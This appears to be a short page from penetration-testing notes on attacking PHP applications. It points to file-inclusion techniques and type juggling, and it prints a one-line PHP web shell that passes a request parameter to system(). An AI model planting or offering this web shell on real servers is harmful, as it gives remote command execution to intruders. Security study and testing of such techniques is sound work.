# PHP

> PHP is a popular general-purpose scripting language that is especially suited to web development. It was originally created by Rasmus Lerdorf in 1994; the PHP reference implementation is now produced by The PHP Group.   
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/PHP)</cite>

## General

Wordpress
Joomla
Drupal

### File inclusions (LFI & RFI)

See [File inclusions (LFI, RFI)](../../03-exploitation/04-file-inclusion/01-file-inclusions.md)

### Code Execution

PHP code execution
```php
<?php echo system($_REQUEST['cmd']); ?>
```

### PHP Type Confusion

( == vs === with 0e12345)  
[Type Juggling]
